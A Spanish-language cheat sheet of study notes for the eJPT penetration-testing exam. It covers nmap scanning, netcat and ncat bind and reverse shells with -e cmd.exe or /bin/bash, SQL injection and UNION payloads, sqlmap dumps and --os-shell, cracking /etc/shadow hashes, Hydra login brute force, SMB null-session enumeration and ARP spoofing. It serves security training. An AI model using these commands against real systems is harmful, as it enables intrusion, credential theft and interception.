# eJPT
 
   ## Routing table
   
   Ver tabla de rutas:
   
    netstat -rn
    Kernel IP routing table
    Destination      Gateway        Genmask         Flags   MSS Window  irtt Iface
    ...
    192.168.88.0     10.10.34.1     255.255.255.0   UG        0 0          0 tap0
    ...
    
    route
 
 Añadir ruta:
 
    ip route add 192.168.88.0/24 via 10.10.34.1
 
   ## Network mapping

   Para hacer ping a un rango de IP's, utilizamos fping:

      fping -g -a IPRANGE

   -a nos muestra los hosts activos

   -g indica que hacemos un ping de un rango de IP's
   
   Para evitar errores, añadimos la salida a /dev/null:
   
     fping -g -a IPRANGE 2>/dev/null
     
   ## nmap
   
   Ping scan (nos dice qué hosts están activos):
   
    nmap -sN IP

  También podemos hacerlo desde un fichero .txt con IP's:
  
    nmap -sn -iL hostlist.txt
    
  Para hacer OS fingerprinting y conocer los detalles del SO:
  
    nmap -Pn -O <target>
    
  Para escanear puertos y sacar servicios asociados:
  
    nmap -sC -sV -pP1,P2,P3 <ip>
    
  -Pn = evitamos ping scan
  
  También podemos utilizar --osscan-limit que irá más rápido y mostrará solamente objetos prometedores. También --osscan-guess cuando nmap no puede detectar nada pero muestra lo que más se aproxima:
  
    nmap -Pn -O --osscan-limit <target>
    nmap -Pn -O --osscan-guess <target>
    
## Tipos de escaneo con nmap

###### TCP SCAN

 Determina qué puertos TCP y UDP están abiertos y qué demonio está escuchando en esos puertos (software y versión), enviando señales al target y analizando la respuesta. Establece una conexión:
 
 <img src="https://user-images.githubusercontent.com/111526713/189317504-3e2cc9a2-0ced-47ee-a3c4-e4e271c9ddca.png" width="400" />

###### SYN SCAN

 Para evitar detecciones y que el daemon log de la aplicación registre el escaneo, se utiliza el SYN SCAN. NO establece una conexión, por lo que no deja rastro y es más difícil de detectar. Envía una señal RST para no crear la conexión.
 
 <img src="https://user-images.githubusercontent.com/111526713/189333458-edcb269b-d42d-4f15-9496-85f5fc12a1a1.png" width="500" />

Parámetros de escaneo:

    -sN -> ping scan

    -sT -> TCP connect scan : alternativa al SYN scan por falta de permisos o IPV6. Deja rastro ya que establece conexión.
    
    -sS -> SYN scan : sigilosa y poco molesta, no completa la conexión, cierra con RST (SYN/ACK -> open port, RST -> closed port)
    
    -sV -> version detection scan : lee el banner del daemon corriendo en el puerto para identificar la versión del software.
    
    -Pn -> fuerza el escaneo de puertos en un servidor y evita realizar el ping scan, tratándolos como si estuviesen abiertos por defecto.
    
   ## Netcat
   
   Abre una conexión sin procesar a un puerto web:
   
      nc -v <target_address> 80
   
  Enviamos una petición HTTP a través de HEAD o GET. Hay que saber que existen 2 línes en blanco entre la cabecera del mensaje y el mensaje en sí:
  
    ...
    GET / HTTP/1.1
    Host: www.ferrari.com # 2 líneas en blanco después de esta linea

    ...
    HEAD / HTTP/1.1
    Host: www.ferrari.com

    ...
    HEAD /en_en/ HTTP/1.1
    Host: www.ferrari.com
    
 ## Netcat server (listener)
 
    nc -lvp 8888
    
 -lvp = listener / verbosity / port
 
   Si escucha en 0.0.0.0 -> escucha desde todas las interfaces. 
   
   Para conectar a ese servidor en puerto 8888 desde otra terminal:
   
    nc -v 127.0.0.1 8888 (-e commando)
    
    Ejemplo: nc -lvp 1337 -e /bin/bash
    
## Openssl
   
 Si tenemos que enviar una petición HTTPS, tenemos que utilizar openssl, ya que netcat no funciona con peticiones https:
 
    $ openssl s_client -connect hack.me:443
    $ openssl s_client -connect hack.me:443 -debug
    $ openssl s_client -connect hack.me:443 -state
    $ openssl s_client -connect hack.me:443 -quiet

    # Evitamos el certificado

    GET / HTTP/1.1
    Host: hack.me

    OPTIONS / HTTP/1.1
    Host: hack.me

   ## HTTP verbs
   
      GET -> abre o solicita un recurso, por ejemplo, una web desde el navegador. Puede pasar argumentos.
      
      POST -> envía HTML format data. Parámetros en el body (p.ej username, passwd...)
      
      HEAD -> como GET pero sólo para la cabecera
      
      PUT -> sube ficheros al servidor
      
      DELETE -> borra ficheros del servidor
      
      OPTIONS -> consulta al web server acerca de los verbos HTTP activos
      
  Para saber qué verbos tenemos disponibles, utilizamos:
  
     nc -v victim.site 80
     
     OPTIONS /HTTP/1.0
     
     Allow: GET, HEAD, POST
     
 Para borrar un recurso:
 
    DELETE /path/to/resource.txt
   
Para subir un fichero, tenemos que saber antes cuanto es de largo nuestro payload.php:

    wc -m payload.php
    
    
## SQL Injection

 <img src="https://user-images.githubusercontent.com/111526713/189478292-06a88aac-0e42-4218-8368-596098aa8e50.png" width="400" />
 
 Se basa en tomar el control de las sentencias SQL utilizadas por la aplicación. 
 
    $connection = objeto que referencia la conexión con la DB
    $query = consulta a ejecutar
    $mysqli_query() = función que envía la consulta a la DB
    
Necesitamos un código SQL dinámico, por ejemplo:

    select name, description from products where ID=$id
    
    select name, description from products where ID='' or 'a'='a';
    
    http://urltest.com/view.php?id=1003'
    
    http://urltest.com/view.php?id='' or 1=1;-- -
    
    http://urltest.com/view.php?id='' or 1=21;-- -
    
 En este caso, buscamos por ID vacío, donde no nos devolverá ningún resultado, o donde la condición sea always true condition, donde mostrará todo el contenido de la tabla Productos.
 
 También se puede hacer utilizando UNION SELECT:
 
    select * from accounts where ID='' UNION SELECT username,pass from accounts where 'a'='a';
    
 Para conocer el número de columnas en la base de datos:
 
    =?id=test' UNION SELECT 'els1','els2';-- -
 
 Vamos añadiendo 'els3','els3'...hasta que no nos salga un error. Así sabremos el número de columnas.
 
## SQLMAP

    sqlmap -u url 
           -b=database_banner
           --tables= nos muestra las tablas de la BD
           --current_db dbname --columns
           --dump=passwords
           --technique
           -p= parámtero a inyectar
           --users
           --dbs
           -D dbname -T table -C column1,column2 --dump
           
muestra las databases:

    sqlmap -u http://10.10.10.15/?id=4 --dbs

muestra las tablas:

    sqlmap -u http://10.10.10.15/?id=4 -D dbname --tables

si no aparecen, guess tables utilizia los nombres más comunes:

    sqlmap -u http://10.10.10.15/?id=4 -D dbname --common-tables

dump de datos de una tabla:

    sqlmap -u http://10.10.10.15/?id=4 -D dbname -T table --dump

consiguiendo os shell:

    sqlmap -u http://10.10.10.15/?id=4 --os-shell

           
 Si tenemos que lanzarlo contra un login form (login.php)
 
    sqlmap -u url --data='user=a&pass=b' -p user --technique=B(oolean)
      
## Backdoor

 ###### ncat
 
 Máquina víctima:
 
    ncat -l(istener) -p(ort) 5555 -e(xecute) cmd.exe
     
 Máquina ataque:
 
    ncat IP port
     
 Reverse connection ncat:
 
 Ataque:
 
    ncat -l -p 5555 -v
    
 Víctima:

    ncat -e cmd.exe IP port
    
## John the ripper

<img src="https://user-images.githubusercontent.com/111526713/189479694-c473d41b-bb36-48f6-b3dd-437150e3631c.png" width="350" />

    john --list=format
   
 John necesita usuarios y hashes en el mismo fichero para crackearlos, para ello:
 
    /etc/passwd
    /etc/shadow
 
    unshadow passwd shadow > crackme
    
 Ataques bruteforce y de diccionario:
    
    john --list=formats
    john -incremental -users:<users list> <file to crack>       # para crackear sólo algunos usuarios de algún fichero como /etc/shadow   
    john --show crackme     # Muestra los passwords crackeados del fichero crackme
    john -wordlist=<wordlist> <file to crack>
    john -wordlist=<wordlist> -rules <file to crack>        # reglas utilizadas para crackear palabras como cat con difernetes combinaciones como c@t,caT,CAT,CaT
   
 ## Hydra  
   
    hydra crackme.site http-post-form "/login.php:usr=^USER^&pwd=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt -f -V
    
 http-post-form = tipo de ataque
 
 /login.php = destino de ataque
 
 usr=^USER^&pwd=^PASS^ = nombre de los login form 
 
 invalid credentials = mensaje que aparece cuando el login es incorrecto
 
 -L = lista de usuarios a testear
 
 -P = lista de passwords a testear 
 
 -f = si encuentra una combinación correcta, deja de atacar
 
 -V = verbose
 
 ## Hashcat
 
    hashcat64.exe -m 0 -a(ttack) 0 -D2 example.hash example.dict (-r rules)
   
  -m = seleccionamos el tipo de hash a crackear
  
  -a = seleccionamos el tipo de ataque (0 = ataque de diccionario)
  
 ## Netbios
 
 Network Basic input output system (puertos comunes: 135,139,445)
 
 Cuando vemos los recursos compartidos de red estamos utilizando NetBios, compartiendo:
 
    - Hostname
    - NetBios name
    - Domain
    - Network shares

<img src="https://user-images.githubusercontent.com/111526713/189481022-f769b688-79cc-4696-9104-5f37cd3f5048.png" width="400" />

    TCP = transmite datos hacia y desde Windows shares
    NB datagram UDP = Lista compartidos y máquinas
    NB names UDP = Encuentra Workgroups
    
  Compartidos en Windows:
  
    \\computer_name\C$ -> accede a un volumen
    \\computer_name\admin$ -> windows installation dir
    \\computer_name\IPC$ -> inter-process communication
    
 ## Null sessions
 
 **Explota una vulnerabilidad de autenticación de Windows administrative shares, que permite al atacante conectarse a un compartido local o remoto SIN autentificación.**
 
 Enumeramos recursos y vulns con nmap:
 
    nmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains 10.10.10.10 -p 135,139,445 
    nmap -p445 --script=smb-vuln-* 10.10.10.10 
 
  Enumerar recursos compartidos en Windows:
  
    nbstat /?
    nbstat -A <ip>
    
    <00> = workstation
    UNIQUE = una sola IP asignada
    <20> = file sharing service levantado y corriendo
    
    Para enumerarlo:
    
    net view <ip>
    
    nmblookup -A <ip>
    
  Para conectarnos
  
    net use \\ip\IPC$ " /u:"
    
  Enumerar recursos compartidos en Windows:
  
    smbclient -L //ip -N
    
  -L servicios disponibles
  
  -N no pregunta por passwords
  
  Nos mostrará también los compartidos administrativos como IPC$, C$, admin$.
  
  Para conectarnos:
  
    smbclient //IP/IPC$ -N
    
 ###### Otras herramientas
 
   Enum (Win):
   
     enum -S ip -> servicios
     enum -U ip -> users
     enum -P ip -> network auth attack
   
  Enum4linux 
  
 Verbose mode:
  
     enum4linux -v target-ip
     
Ejecuta todo excepto el ataque guess de diccionario:

    enum4linux -A target-ip
    
Lista nombres de usuario (RestrictAnonymous = 0):

    enum4linux -U target-ip
	
Si hemos logrado obtener credenciales, podemos obtener una lista completa de usuarios independientemente de la opción RestrictAnonymous:

    enum4linux -u administrator 
    -p password -U target-ip
    
Lista grupos:

    enum4linux -G target-ip
    
Lista Windows shares:

    enum4linux -S target-ip
	
Ataque de diccionario para Windows shares:
 
    enum4linux -s shares.txt target-ip

Muestra información del SO:

    enum4linux -o target-ip

Información sobre impresoras compartidas:

    enum4linux -i target-ip
	
Muestra la politica de constraseñas:

    enum4linux -P ip
  
 ###### Samrdump
 
 Nos da información sobre SAM (Security account manager), username y UID de la cuenta SAM:
 
 	/usr/share/doc/python-impacket-doc/examples/
	./samrdump.py
	python samrdump.py IP
	
###### NMAP

    nmap -script=smb-enum-shares ip
    nmap -script=smb-enum-users ip
    nmap -script=smb-brute
    
## ARPSPOOF

Activamos Linux Kernel para transformar Linux en router:

    echo 1 > /proc/sys/net/ipv4/ip_forward
    
Lanzamos arpspoof:

    arpspoof -i <interfaz> -t <target> -r <host>
